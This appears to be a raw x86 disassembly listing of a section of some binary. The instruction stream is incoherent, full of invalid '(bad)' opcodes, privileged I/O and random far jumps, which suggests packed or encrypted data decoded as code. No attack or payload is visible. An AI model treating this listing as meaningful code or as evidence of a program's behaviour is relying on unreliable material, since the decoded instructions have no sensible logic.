  41f336:	sub    bh,BYTE PTR [edi+0x4b]
  41f339:	jmp    0x95653881
  41f33e:	loopne 0x41f330
  41f340:	mov    WORD PTR [edi-0x27],ss
  41f343:	mov    BYTE PTR [eax-0xd9c3e57],cl
  41f349:	jl     0x41f38d
  41f34b:	mov    esi,0xf51d5245
  41f350:	(bad)  
  41f351:	pop    ebp
  41f352:	xor    BYTE PTR [edx],al
  41f354:	fisubr DWORD PTR [ebx]
  41f356:	sbb    ebp,edx
  41f358:	add    ebp,DWORD PTR [esi-0x2c735ff8]
  41f35e:	xchg   DWORD PTR [ecx],edx
  41f360:	leave  
  41f361:	sbb    al,0x8d
  41f363:	cmp    ch,BYTE PTR [esi]
  41f365:	sbb    BYTE PTR [ebx+0x7b],dl
  41f368:	cmp    al,0x7d
  41f36a:	add    eax,0xb4b30788
  41f36f:	add    ebx,DWORD PTR [ebp+0x16]
  41f372:	sub    DWORD PTR [edi+ebx*2],eax
  41f375:	mov    esi,0x6677db6e
  41f37a:	xchg   ecx,eax
  41f37b:	cli    
  41f37c:	(bad)  
  41f37d:	arpl   WORD PTR [edx-0x21],dx
  41f380:	pusha  
  41f381:	fnstenv [eax]
  41f383:	jo     0x41f36d
  41f385:	mov    gs:0x9254ac57,eax
  41f38b:	lar    eax,WORD PTR [ebx-0x34611b07]
  41f392:	std    
  41f393:	dec    edx
  41f394:	sbb    DWORD PTR [eax-0x73],esp
  41f397:	lock adc DWORD PTR [ebx+0x2ecc5a8],ebx
  41f39e:	hlt    
  41f39f:	add    al,0xb0
  41f3a1:	sti    
  41f3a2:	aas    
  41f3a3:	ja     0x41f3f5
  41f3a5:	mov    ds:0x791e2be4,eax
  41f3aa:	ss pushf 
  41f3ac:	aad    0x41
  41f3ae:	jle    0x41f3f6
  41f3b0:	mov    eax,ds:0xf85680b7
  41f3b5:	push   0xa31d8879
  41f3ba:	in     al,0x51
  41f3bc:	mov    bh,0x3
  41f3be:	clc    
  41f3bf:	sub    edx,ebx
  41f3c1:	jmp    0x24729c96
  41f3c6:	stc    
  41f3c7:	call   0x6a41e9f7
  41f3cc:	mov    BYTE PTR [edx-0x44],ch
  41f3cf:	shr    edx,1
  41f3d1:	retf   0x2f42
  41f3d4:	push   ss
  41f3d5:	fucom  st(6)
  41f3d7:	popf   
  41f3d8:	inc    ebx
  41f3d9:	xor    ebx,DWORD PTR [edx+0x1c]
  41f3dc:	leave  
  41f3dd:	push   ebx
  41f3de:	int    0x2f
  41f3e0:	out    dx,al
  41f3e1:	repnz pop ebx
  41f3e3:	mov    edi,0xafd82195
  41f3e8:	pop    ecx
  41f3e9:	icebp  
  41f3ea:	stc    
  41f3eb:	push   edi
  41f3ec:	sub    eax,0xc0101da6
  41f3f1:	xchg   ecx,eax
  41f3f2:	out    0x7b,eax
  41f3f4:	jb     0x41f376
  41f3f6:	mov    ds:0xc6258c8e,al
  41f3fb:	lods   eax,DWORD PTR ds:[esi]
  41f3fc:	out    dx,eax
  41f3fd:	pop    edi
  41f3fe:	mov    BYTE PTR [ebp-0xf],ch
  41f401:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f402:	xchg   BYTE PTR [edx-0x7c29c831],dl
  41f408:	inc    esp
  41f409:	sbb    BYTE PTR [edx-0x48],ch
  41f40c:	cld    
  41f40d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f40e:	das    
  41f40f:	imul   ebp,DWORD PTR ds:0x5acd1c5c,0xeac53961
  41f419:	jge    0x41f492
  41f41b:	shl    eax,0x41
  41f41e:	add    eax,0x994a947
  41f423:	pop    ecx
  41f424:	push   ebx
  41f425:	dec    edx
  41f426:	dec    ebx
  41f427:	xor    al,0x4d
  41f429:	mov    ds:0x7df47ca6,eax
  41f42e:	push   esp
  41f42f:	(bad)  
  41f430:	fdiv   DWORD PTR [ebp+0x77]
  41f433:	cmp    al,ah
  41f435:	test   BYTE PTR [edi],dh
  41f437:	sbb    al,0xe1
  41f439:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41f43b:	in     eax,dx
  41f43c:	dec    esp
  41f43d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f43e:	xor    esi,DWORD PTR [eax-0x313cc869]
  41f444:	mov    dh,0x81
  41f446:	rcl    BYTE PTR [ebx-0x7],cl
  41f449:	or     BYTE PTR [eax+ebx*8],dl
  41f44c:	dec    ecx
  41f44d:	fidivr DWORD PTR [ecx+0x72]
  41f450:	xchg   esi,eax
  41f451:	mov    dh,0xc9
  41f453:	xchg   esi,eax
  41f454:	imul   esp,DWORD PTR [edi],0x8405a059
  41f45a:	mov    bh,0x8e
  41f45c:	inc    ebx
  41f45d:	or     eax,0xc3283756
  41f462:	cmp    DWORD PTR [eax+0x850cb60],ebp
  41f468:	pop    edi
  41f469:	popf   
  41f46a:	daa    
  41f46b:	add    dh,dh
  41f46d:	add    cl,BYTE PTR [edx]
  41f46f:	jne    0x41f4e2
  41f471:	loop   0x41f42f
  41f473:	push   ds
  41f474:	aaa    
  41f475:	stos   DWORD PTR es:[edi],eax
  41f476:	xchg   ebp,eax
  41f477:	ins    BYTE PTR es:[edi],dx
  41f478:	inc    esi
  41f479:	add    al,0xb1
  41f47b:	xchg   edx,eax
  41f47c:	les    edi,FWORD PTR [edx]
  41f47e:	fisub  DWORD PTR [edi]
  41f480:	adc    DWORD PTR [ebp-0x5fe3d437],0xffffffaa
  41f487:	lea    edx,[ecx+0x616b54cb]
  41f48d:	sub    bh,BYTE PTR [eax+0x5cbae907]
  41f493:	mov    esp,0xdc100f8d
	...
  41f514:	push   0xc
  41f516:	lea    ebx,[eax-0x1806611]
  41f51c:	into   
  41f51d:	out    dx,al
  41f51e:	popf   
  41f51f:	adc    ebx,DWORD PTR [ebp-0x68]
  41f522:	jmp    0x41f4ea
  41f524:	or     eax,0x6c00018f
  41f529:	pop    es
  41f52a:	add    BYTE PTR [eax],al
  41f52c:	cli    
  41f52d:	in     al,0x35
  41f52f:	pop    es
  41f530:	add    al,0x39
  41f532:	push   cs
  41f533:	fsubr  st(7),st
  41f535:	mov    ecx,0x5d0a9040
  41f53a:	out    0x5d,eax
  41f53c:	or     esp,DWORD PTR [ecx]
  41f53e:	aas    
  41f53f:	xchg   DWORD PTR [eax+0x4f9f6210],ebx
  41f545:	(bad)  
  41f547:	sbb    DWORD PTR [esp+edx*8+0x48141a86],esp
  41f54e:	pop    ebp
  41f54f:	xor    BYTE PTR [edx-0x1c2e3775],dh
  41f555:	ficom  DWORD PTR ss:0xf0f14ab4
  41f55c:	mov    ebx,0xc2424c55
  41f561:	add    edx,esi
  41f563:	add    BYTE PTR [ecx+0x4be59a45],0xfc
  41f56a:	pop    ds
  41f56b:	sbb    eax,0xd59fdbc2
  41f570:	rol    BYTE PTR [ebx-0x1e],1
  41f573:	mov    BYTE PTR [edi-0x66],0xb1
  41f577:	sar    BYTE PTR [ecx+0x28072474],0xc1
  41f57e:	test   BYTE PTR ds:0xe4002e40,al
  41f584:	mov    DWORD PTR [esi-0x4dd45fa3],0x2c90bdb5
  41f58e:	int    0x6b
  41f590:	cmp    al,BYTE PTR [eax+0x5a]
  41f593:	xchg   cx,ax
  41f595:	add    al,0xd6
  41f597:	ja     0x41f5e1
  41f599:	sub    al,0xc5
  41f59b:	data16 mov ch,0xf7
  41f59e:	(bad)  
  41f59f:	mov    esp,0x863a6f3d
  41f5a4:	cwde   
  41f5a5:	xchg   edi,eax
  41f5a6:	push   ss
  41f5a7:	cmp    al,BYTE PTR [ebx-0x2d1d8177]
  41f5ad:	adc    al,0x9c
  41f5af:	inc    edi
  41f5b0:	fwait
  41f5b1:	outs   dx,DWORD PTR ds:[esi]
  41f5b2:	inc    eax
  41f5b3:	mov    al,ds:0xd5797ed2
  41f5b8:	mov    ds:0xa6319582,al
  41f5bd:	add    esi,DWORD PTR [ebx]
  41f5bf:	aam    0xd1
  41f5c1:	jb     0x41f62a
  41f5c3:	push   ss
  41f5c4:	lods   eax,DWORD PTR ds:[esi]
  41f5c5:	popf   
  41f5c6:	out    dx,eax
  41f5c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f5c8:	in     al,dx
  41f5c9:	popf   
  41f5ca:	pop    ds
  41f5cb:	pop    eax
  41f5cc:	sbb    al,0xfb
  41f5ce:	shr    edx,0xb4
  41f5d1:	stc    
  41f5d2:	push   ss
  41f5d3:	and    al,0x5d
  41f5d5:	in     eax,0x95
  41f5d7:	sbb    DWORD PTR [ecx+0x6fb3dbc5],edx
  41f5dd:	(bad)  
  41f5de:	xchg   ebp,eax
  41f5df:	sub    DWORD PTR [ebp+0x14cf5acb],0xffffffc0
  41f5e6:	mov    DWORD PTR ds:0xb3d46f82,ebx
  41f5ec:	xlat   BYTE PTR ds:[ebx]
  41f5ed:	mov    DWORD PTR [edx],edi
  41f5ef:	fdivr  st(4),st
  41f5f1:	ret    
  41f5f2:	inc    ecx
  41f5f3:	loope  0x41f5e9
  41f5f5:	stos   BYTE PTR es:[edi],al
  41f5f6:	nop
  41f5f7:	mov    bh,0x76
  41f5f9:	outs   dx,BYTE PTR ds:[esi]
  41f5fa:	stos   BYTE PTR es:[edi],al
  41f5fb:	out    dx,al
  41f5fc:	mov    al,0x87
  41f5fe:	js     0x41f5e9
  41f600:	int    0x3f
  41f602:	stc    
  41f603:	mov    esp,0x2ad218a7
  41f608:	add    ah,bl
  41f60a:	sar    ecx,0x97
  41f60d:	outs   dx,DWORD PTR ds:[esi]
  41f60e:	jle    0x41f630
  41f610:	outs   dx,BYTE PTR ds:[esi]
  41f611:	lds    ecx,FWORD PTR [eax]
  41f613:	nop
  41f614:	out    0xb3,eax
  41f616:	mov    eax,0x5a48b508
  41f61b:	inc    esp
  41f61c:	jb     0x41f681
  41f61e:	pushf  
  41f61f:	pop    ebp
  41f620:	mov    ss,WORD PTR [edx]
  41f622:	repz add bl,BYTE PTR [esi+ebx*4+0x3a]
  41f627:	popf   
  41f628:	fwait
  41f629:	out    0x6e,eax
  41f62b:	add    al,0x42
  41f62d:	push   ebx
  41f62e:	cdq    
  41f62f:	xchg   ecx,eax
  41f630:	ret    
  41f631:	shl    DWORD PTR [ebx],0xd9
  41f634:	mov    eax,ds:0xc770e210
  41f639:	imul   edi,DWORD PTR [ebx-0x7b350422],0xffffffc1
  41f640:	mov    dh,0x5d
  41f642:	xchg   DWORD PTR [esi],esi
  41f644:	push   eax
  41f645:	mov    edi,0x3395d7a7
  41f64a:	jb     0x41f66c
  41f64c:	(bad)  
  41f64d:	iret   
  41f64e:	mov    ah,0x52
  41f650:	dec    ecx
  41f651:	mov    ebx,0x28a12865
  41f656:	mov    es,WORD PTR [esi+0x63217cbb]
  41f65c:	aaa    
  41f65d:	clc    
  41f65e:	imul   eax,eax,0x708896a8
  41f664:	push   eax
  41f665:	(bad)  
  41f666:	sbb    al,cl
  41f668:	lahf   
  41f669:	adc    dl,BYTE PTR [ebp+ebp*2-0x51398968]
  41f670:	mov    ds:0x8d4873b4,eax
  41f675:	inc    ecx
  41f676:	retf   
  41f677:	mov    ebx,0x3d6f2201
  41f67c:	cld    
  41f67d:	adc    eax,0xa12c0b86
  41f682:	fld    DWORD PTR [edi+0x68]
  41f685:	and    al,0xa5
  41f687:	add    ah,cl
  41f689:	(bad)  
  41f68b:	push   ebx
  41f68c:	adc    al,0x8d
  41f68e:	cmp    ebx,ebp
  41f690:	jbe    0x41f696
  41f692:	push   ebp
  41f693:	xchg   ebx,eax
  41f694:	xchg   esp,eax
  41f695:	jmp    0x41f6b0
  41f697:	pop    eax
  41f698:	add    ch,BYTE PTR [ecx+0x55]
  41f69b:	inc    esi
  41f69c:	add    bh,BYTE PTR [eax]
  41f69e:	cmp    BYTE PTR [eax+0x39],ch
  41f6a1:	int3   
  41f6a2:	sbb    esp,edx
  41f6a4:	cwde   
  41f6a5:	and    eax,0x79c1f3d3
  41f6aa:	gs and eax,0xc008ac8a
  41f6b0:	stc    
  41f6b1:	cs sbb dh,0x91
  41f6b5:	or     esp,DWORD PTR [eax+0x2415073e]
  41f6bb:	outs   dx,BYTE PTR ds:[esi]
  41f6bc:	add    DWORD PTR [eax+ebp*4+0x7],edi
  41f6c0:	test   al,0xa5
  41f6c2:	(bad)  
  41f6c3:	mov    fs,WORD PTR es:[ecx]
  41f6c6:	(bad)  
  41f6c7:	mov    edi,0xa4519827
  41f6cc:	ins    BYTE PTR es:[edi],dx
  41f6cd:	sbb    bl,0x5a
  41f6d0:	retf   
  41f6d1:	in     eax,dx
  41f6d2:	jl     0x41f6d9
  41f6d4:	imul   BYTE PTR [eax]
  41f6d6:	mov    ecx,DWORD PTR [ecx+0x38]
  41f6d9:	push   0x97579939
  41f6de:	cmp    al,ch
  41f6e0:	or     eax,0x7012d7e5
  41f6e5:	outs   dx,DWORD PTR ds:[esi]
  41f6e6:	sbb    DWORD PTR ds:0x5c33ffd9,0xffffffeb
  41f6ed:	lahf   
  41f6ee:	sub    al,0x37
  41f6f0:	(bad)  
  41f6f1:	cli    
  41f6f2:	mov    ah,0x4d
  41f6f4:	ret    0xae62
  41f6f7:	hlt    
  41f6f8:	repnz fild WORD PTR [edx+0x20]
  41f6fc:	das    
  41f6fd:	lds    ebx,FWORD PTR [edx+0x5127a9b7]
  41f703:	ret    0xadf2
  41f706:	mov    esp,0x820925b2
  41f70b:	adc    ah,BYTE PTR [esi]
  41f70d:	stos   DWORD PTR es:[edi],eax
  41f70e:	pop    edx
  41f70f:	pop    ss
  41f710:	add    BYTE PTR [ecx-0x3dfbc8db],dh
  41f716:	inc    DWORD PTR [edi]
  41f718:	dec    edx
  41f719:	sub    ah,BYTE PTR [ebp+edx*1-0x12d06f3e]
  41f720:	leave  
  41f721:	mov    ah,ch
  41f723:	dec    ecx
  41f724:	jnp    0x41f778
  41f726:	mov    bl,0xbb
  41f728:	in     eax,dx
  41f729:	sahf   
  41f72a:	test   bh,dh
  41f72c:	jl     0x41f6b6
  41f72e:	mov    dh,0xcc
  41f730:	repz inc esi
  41f732:	sbb    eax,0x9a352c7
  41f737:	pop    eax
  41f738:	(bad)  
  41f739:	(bad)
  41f73c:	and    BYTE PTR [eax-0xc],cl
  41f73f:	dec    esi
  41f740:	shr    dh,cl
  41f742:	sub    al,0x99
  41f744:	stos   DWORD PTR es:[edi],eax
  41f745:	les    edi,FWORD PTR [edx-0x1a]
  41f748:	jecxz  0x41f703
  41f74a:	retf   
  41f74b:	ins    BYTE PTR es:[edi],dx
  41f74c:	ret    
  41f74d:	fstp   TBYTE PTR ds:0x8a10f133
  41f753:	adc    DWORD PTR [esi],edi
  41f755:	repz pop ecx
  41f757:	pop    ecx
  41f758:	fwait
  41f759:	mov    dh,0xd
  41f75b:	xchg   bl,ah
  41f75d:	adc    eax,0x6b1420fa
  41f762:	push   esi
  41f763:	jae    0x41f767
  41f765:	test   BYTE PTR gs:[ebx+0x429de62e],bl
  41f76c:	cdq    
  41f76d:	fadd   st(4),st
  41f76f:	pop    ebx
  41f770:	out    0x49,al
  41f772:	pop    edi
  41f773:	mov    bl,0xac
  41f775:	lahf   
  41f776:	ret    
  41f777:	or     eax,0xcfed477d
  41f77c:	fsqrt  
  41f77e:	test   DWORD PTR [eax],edi
  41f780:	inc    edx
  41f781:	dec    ebx
  41f782:	dec    eax
  41f783:	imul   ebx,DWORD PTR [ecx+0x72],0xffffff81
  41f787:	cmp    bh,ah
  41f789:	xchg   ebp,eax
  41f78a:	jl     0x41f776
  41f78c:	cld    
  41f78d:	(bad)  
  41f78e:	sbb    ebx,DWORD PTR [ecx]
  41f790:	loop   0x41f791
  41f792:	push   esi
  41f793:	clc    
  41f794:	(bad)  
  41f795:	dec    edi
  41f796:	(bad)  
  41f797:	test   BYTE PTR [edi+0x78],bl
  41f79a:	jp     0x41f777
  41f79c:	add    ah,BYTE PTR [ebx]
  41f79e:	js     0x41f7e8
  41f7a0:	jne    0x41f74a
  41f7a2:	sub    DWORD PTR cs:[eax],ebp
  41f7a5:	mov    ds:0x652e5dfe,eax
  41f7aa:	or     BYTE PTR [ecx],dl
  41f7ac:	add    eax,0x98181f75
  41f7b1:	xor    BYTE PTR [ecx+0x77],ah
  41f7b4:	repz sub DWORD PTR [edi+0x5253a2d5],eax
  41f7bb:	lahf   
  41f7bc:	fisttp WORD PTR [esi-0x50]
  41f7bf:	push   ss
  41f7c0:	call   0x95e62f60
  41f7c5:	(bad)  
  41f7c6:	sub    al,0x31
  41f7c8:	inc    eax
  41f7c9:	cld    
  41f7ca:	fisub  WORD PTR [eax]
  41f7cc:	jno    0x41f825
  41f7ce:	jno    0x41f7c4
  41f7d0:	inc    ebx
  41f7d1:	or     DWORD PTR [ebp+0x49ed3186],ecx
  41f7d7:	xchg   ebp,eax
  41f7d8:	ret    
  41f7d9:	sub    eax,0x23d7a728
  41f7de:	xchg   ecx,eax
  41f7df:	sbb    al,0xa8
  41f7e1:	push   edi
  41f7e2:	mov    ds,WORD PTR [ebx+0x5a]
  41f7e5:	aaa    
  41f7e6:	ins    BYTE PTR es:[edi],dx
  41f7e7:	jbe    0x41f7a4
  41f7e9:	cli    
  41f7ea:	pop    ecx
  41f7eb:	push   ebp
  41f7ec:	dec    esp
  41f7ed:	call   0x1b076367
  41f7f2:	fimul  WORD PTR [esp+eax*2-0x5e]
  41f7f6:	sub    eax,0x4128aa3f
  41f7fb:	les    eax,FWORD PTR [edx]
  41f7fd:	xchg   esi,eax
  41f7fe:	push   ecx
  41f7ff:	ret    0x4d81
  41f802:	jl     0x41f7f3
  41f804:	mov    ds:0xa5a5fbcd,eax
  41f809:	in     eax,dx
  41f80a:	mov    ds:0xe2817aaf,al
  41f80f:	push   ecx
  41f810:	adc    eax,0x37f894b0
  41f815:	stc    
  41f816:	je     0x41f868
  41f818:	jl     0x41f7e3
  41f81a:	cmp    eax,0x61926327
  41f81f:	xchg   edx,eax
  41f820:	push   ecx
  41f822:	mov    ds:0x6e6a48b1,al
  41f827:	jle    0x41f86e
  41f829:	jmp    0x903b:0x26b27f61
  41f830:	mov    ds:0x728cc248,al
  41f835:	ja     0x41f832
  41f837:	add    al,0xbd
  41f839:	cmp    bh,BYTE PTR [esi-0x7bccf593]
  41f83f:	mov    ebp,0x2ced7751
  41f844:	int    0x91
  41f846:	in     eax,dx
  41f847:	aaa    
  41f848:	mov    al,ds:0x6e5ca9ef
  41f84d:	mov    eax,ds:0xa0e2a48d
  41f852:	push   edx
  41f853:	xor    DWORD PTR [ecx],ebx
  41f855:	and    cl,dh
  41f857:	retf   
  41f858:	sbb    eax,0x1f12814b
  41f85d:	pop    edi
  41f85e:	dec    edx
  41f85f:	shr    DWORD PTR [edx-0x3a],cl
  41f862:	int3   
  41f863:	mov    DWORD PTR [eax-0x5f7718ea],ebp
  41f869:	adc    al,0xfb
  41f86b:	test   BYTE PTR [ecx-0x6f085e63],bl
  41f871:	and    cl,BYTE PTR [eax+0x1a]
  41f874:	ret    
  41f875:	outs   dx,DWORD PTR ds:[esi]
  41f876:	fnsave [eax]
  41f878:	jae    0x41f868
  41f87a:	jne    0x41f8bf
  41f87c:	jge    0x41f822
  41f87e:	jge    0x41f8cb
  41f880:	into   
  41f881:	add    ebx,DWORD PTR [eax+eax*4-0x34827ff8]
  41f888:	icebp  
  41f889:	sbb    eax,0x8735ba71
  41f88e:	stos   BYTE PTR es:[edi],al
  41f88f:	cmp    BYTE PTR [esi+ebx*1+0x6f],dl
  41f893:	push   0xa9d4dd8a
  41f898:	sub    dh,BYTE PTR [edx-0x64a0e3a3]
  41f89e:	leave  
  41f89f:	cli    
  41f8a0:	xor    edi,eax
  41f8a2:	push   eax
  41f8a3:	fucompp 
  41f8a5:	mov    eax,ds:0x4c56c3b6
  41f8aa:	pop    es
  41f8ab:	inc    edx
  41f8ac:	jecxz  0x41f867
  41f8ae:	push   eax
  41f8af:	das    
  41f8b0:	push   ecx
  41f8b1:	sub    eax,0xe869d84a
  41f8b6:	ret    
  41f8b7:	vdivpd ymm1,ymm4,YMMWORD PTR ds:0xde923a80
  41f8bf:	mov    ebx,0x8fd7cda1
  41f8c4:	leave  
  41f8c5:	int3   
  41f8c6:	sbb    ebp,esi
  41f8c8:	mov    ebx,0xad38cb16
  41f8cd:	dec    esi
  41f8ce:	popa   
  41f8cf:	fist   DWORD PTR [ecx-0x7981d6e2]
  41f8d5:	imul   ecx,DWORD PTR [eax-0x38],0xffffffcb
  41f8d9:	pop    edx
  41f8da:	(bad)  
  41f8dc:	outs   dx,DWORD PTR ds:[esi]
  41f8dd:	out    0xb2,eax
  41f8df:	daa    
  41f8e0:	cmp    bh,0x75
  41f8e3:	dec    ebp
  41f8e4:	sbb    BYTE PTR [edx+edi*4+0x39],dh
  41f8e8:	imul   ebp,esp,0x1d
  41f8eb:	inc    esp
  41f8ec:	mov    esp,0xb10fb729
  41f8f1:	cmp    al,0xd4
  41f8f3:	test   BYTE PTR [ecx*8+0x7d558a9b],0xae
  41f8fb:	in     al,dx
  41f8fc:	pusha  
  41f8fd:	fisub  WORD PTR [ebp+0x67a84caa]
  41f903:	mov    ds:0x498b7c1a,eax
  41f908:	icebp  
  41f909:	dec    edx
  41f90a:	iret   
  41f90b:	ficom  WORD PTR [edx+0x100bd897]
  41f911:	retf   
  41f912:	mul    DWORD PTR [ecx+ebp*1]
  41f915:	mov    bl,0x8
  41f917:	stos   DWORD PTR es:[edi],eax
  41f918:	stc    
  41f919:	gs hlt 
  41f91b:	aas    
  41f91c:	das    
  41f91d:	lods   al,BYTE PTR ds:[esi]
  41f91e:	imul   edi,DWORD PTR [edi+0x39],0xc
  41f922:	mov    al,0xab
  41f924:	sbb    al,0x26
  41f926:	out    0xfd,al
  41f928:	add    BYTE PTR [edi+esi*8-0x4a],cl
  41f92c:	jnp    0x41f8c0
  41f92e:	pop    ds
  41f92f:	and    BYTE PTR [eax-0x7e5ad2dc],dh
  41f935:	mov    bh,0xee
  41f937:	inc    ebx
  41f938:	hlt    
  41f939:	inc    edx
  41f93a:	xchg   al,al
  41f93c:	pusha  
  41f93d:	lahf   
  41f93e:	mov    ds:0x88fcbec8,eax
  41f943:	jge    0x41f8d8
  41f945:	leave  
  41f946:	rcl    ebp,0x34
  41f949:	out    dx,eax
  41f94a:	dec    esi
  41f94b:	jbe    0x41f983
  41f94d:	push   cs
  41f94e:	sub    ah,ch
  41f950:	and    ebx,ecx
  41f952:	push   esi
  41f953:	sbb    eax,esp
  41f955:	in     eax,dx
  41f956:	sub    edi,DWORD PTR [esi]
  41f958:	out    dx,al
  41f959:	push   0x1ad94106
  41f95e:	stos   BYTE PTR es:[edi],al
  41f95f:	mov    esi,0x83072e32
  41f964:	fbld   TBYTE PTR gs:[edx+0x30e0f5d3]
  41f96b:	mov    ecx,DWORD PTR [edi]
  41f96d:	mov    al,0xad
  41f96f:	cld    
  41f970:	fmul   DWORD PTR [esi+0x22]
  41f973:	(bad)  
  41f977:	repnz cwde 
  41f979:	std    
  41f97a:	mov    WORD PTR [eax+0x5d],?
  41f97d:	mov    ebp,0x5cedb583
  41f982:	jnp    0x41f944
  41f984:	lock jg 0x41fa06
  41f987:	push   ebp
  41f988:	adc    edx,DWORD PTR [ebp-0x1b440ce0]
  41f98e:	enter  0x4dc0,0x50
  41f992:	mov    ebx,0x51fa257f
  41f997:	fs ins BYTE PTR es:[edi],dx
  41f999:	daa    
  41f99a:	das    
  41f99b:	mov    eax,0xa3f46078
  41f9a0:	ins    DWORD PTR es:[edi],dx
  41f9a1:	scas   eax,DWORD PTR es:[edi]
  41f9a2:	mov    ds:0x1d6c3d2e,al
  41f9a7:	cmp    dl,dh
  41f9a9:	mov    dh,0x31
  41f9ab:	data16 fmulp st(1),st
  41f9ae:	dec    esi
  41f9af:	popf   
  41f9b0:	lods   al,BYTE PTR ds:[esi]
  41f9b1:	fadd   QWORD PTR [edi+0x47]
  41f9b4:	in     al,0xc
  41f9b6:	test   BYTE PTR [esi+0x78fb0b2a],ah
  41f9bc:	or     BYTE PTR [ebx],bh
  41f9be:	xchg   edx,eax
  41f9bf:	jo     0x41fa22
  41f9c1:	stos   BYTE PTR es:[edi],al
  41f9c2:	std    
  41f9c3:	jmp    0x41fa03
  41f9c5:	jmp    0x4a1ea42a
  41f9ca:	cmp    al,0x17
  41f9cc:	pop    esp
  41f9cd:	(bad)  
  41f9ce:	mov    al,0xf
  41f9d0:	hlt    
  41f9d1:	clc    
  41f9d2:	jg     0x41f95d
  41f9d4:	in     eax,0xc5
  41f9d6:	jmp    0xed2272d7
  41f9db:	xor    esi,DWORD PTR [edx]
  41f9dd:	add    DWORD PTR [ebx-0x732f870],esi
  41f9e3:	jmp    0xcfb6:0x6c742ae4
  41f9ea:	retf   0x42fb
  41f9ed:	sub    edi,DWORD PTR [edx-0x5f0bcaa9]
  41f9f3:	or     ch,bl
  41f9f5:	pop    ebp
  41f9f6:	adc    ebp,DWORD PTR [ecx+0x3c9c9a2]
  41f9fc:	mov    edx,DWORD PTR [eax]
  41f9fe:	sbb    al,0x42
  41fa00:	jge    0x41f9a5
  41fa02:	mov    BYTE PTR [edx+0x4],bl
  41fa05:	neg    BYTE PTR [esi+ebx*2-0x7b0e4d9b]
  41fa0c:	(bad)  
  41fa0d:	iret   
  41fa0e:	retf   0x7bf8
  41fa11:	popf   
  41fa12:	push   ss
  41fa13:	mov    eax,0xab2d782a
  41fa18:	xchg   DWORD PTR [ecx+0x6ee31832],esi
  41fa1e:	sbb    ebp,edx
  41fa20:	loop   0x41fa84
  41fa22:	sbb    BYTE PTR [esi-0x633dfc90],bl
  41fa28:	add    eax,0x2413d2a8
  41fa2d:	bound  esi,QWORD PTR [eax+0x3c]
  41fa30:	or     al,0xc1
  41fa32:	std    
  41fa33:	aaa    
  41fa34:	and    eax,0xf3ba3f2b
  41fa39:	cmc    
  41fa3a:	aas    
  41fa3b:	push   0x73
  41fa3d:	sbb    ecx,0xffffffac
  41fa40:	pop    dx
  41fa42:	test   dl,bh
  41fa44:	lods   eax,DWORD PTR ds:[esi]
  41fa45:	jl     0x41fa6f
  41fa47:	jle    0x41faae
  41fa49:	xchg   edi,eax
  41fa4a:	sti    
  41fa4b:	cmp    al,0x9b
  41fa4d:	adc    edx,DWORD PTR [edx-0xf]
  41fa50:	ret    
  41fa51:	scas   eax,DWORD PTR es:[edi]
  41fa52:	or     DWORD PTR [ebx+ebp*1-0x7e],edi
  41fa56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa57:	shr    DWORD PTR [ecx],0x1c
  41fa5a:	push   es
  41fa5b:	mov    esp,0x630da6b
  41fa60:	pop    ds
  41fa61:	xchg   BYTE PTR [eax-0x79],ah
  41fa64:	mov    esi,0x400e1caf
  41fa69:	jecxz  0x41fa14
  41fa6b:	dec    eax
  41fa6c:	pop    esi
  41fa6d:	lods   eax,DWORD PTR ds:[esi]
  41fa6e:	mov    ah,0xb
  41fa70:	and    cl,dh
  41fa72:	lods   eax,DWORD PTR ds:[esi]
  41fa73:	sub    ebp,DWORD PTR ds:0x23bb1b42
  41fa79:	pop    ss
  41fa7a:	mov    eax,0x832ad1f5
  41fa7f:	push   0xccbb3bf7
  41fa84:	fs xor al,0xb9
  41fa87:	rol    DWORD PTR [esi+0x4b],0x9e
  41fa8b:	mov    bl,0x10
  41fa8d:	fldenv [eax-0xc]
  41fa90:	dec    esp
  41fa91:	push   esp
  41fa92:	add    BYTE PTR [edi-0x606dc66b],al
  41fa98:	add    DWORD PTR ds:0xac16baae,ecx
  41fa9e:	stc    
  41fa9f:	mov    ecx,0x14bba464
  41faa4:	xor    al,0x53
  41faa6:	xor    eax,0xc085330c
  41faab:	push   esp
  41faac:	jno    0x41fabd
  41faae:	lahf   
  41faaf:	(bad)  
  41fab0:	pop    esi
  41fab1:	out    dx,eax
  41fab2:	adc    ebp,0xad6261c4
  41fab8:	ret    0xa2b9
  41fabb:	cld    
  41fabc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fabd:	inc    eax
  41fabe:	(bad)  
  41fac0:	pushf  
  41fac1:	shl    BYTE PTR [ebx+0x29d45aaf],0xa3
  41fac8:	dec    edx
  41fac9:	imul   eax,DWORD PTR ds:0x3eb4cc47,0x2108a6c8
  41fad3:	je     0x41fb11
  41fad5:	ret    0x20cd
  41fad8:	icebp  
  41fad9:	cmp    al,0x3b
  41fadb:	and    al,0x81
  41fadd:	mov    bh,BYTE PTR [ebp+0x158982f0]
  41fae3:	add    BYTE PTR [edx-0x5f],0x9c
  41fae7:	add    BYTE PTR [edx-0x5ed76d4e],0x21
  41faee:	or     dh,BYTE PTR [edi+0x39]
  41faf1:	dec    edx
  41faf2:	rcl    DWORD PTR [edx+eax*2-0x54],cl
  41faf6:	cmc    
  41faf7:	pcmpeqw mm3,QWORD PTR [edx-0x1c]
  41fafb:	shl    DWORD PTR [eax],0xaf
  41fafe:	sbb    DWORD PTR [ebx+0x5ef1fae3],ebp
  41fb04:	retf   0x4927
  41fb07:	mov    dh,0xda
  41fb09:	pop    es
  41fb0a:	mov    fs,WORD PTR [edx-0x6102ffea]
  41fb10:	inc    edx
  41fb11:	pcmpeqb mm3,mm5
  41fb14:	pop    eax
  41fb15:	(bad)  
  41fb17:	aaa    
  41fb18:	out    dx,eax
  41fb19:	inc    DWORD PTR [edx-0x68bf321]
  41fb1f:	in     al,0x0
  41fb21:	xchg   edx,eax
  41fb22:	das    
  41fb23:	leave  
  41fb24:	inc    ebx
  41fb25:	or     dl,BYTE PTR [ebp-0x40725f34]
  41fb2b:	pop    esi
  41fb2c:	pushf  
  41fb2d:	cld    
  41fb2e:	adc    eax,0x9498b499
  41fb33:	popa   
  41fb34:	repnz pusha 
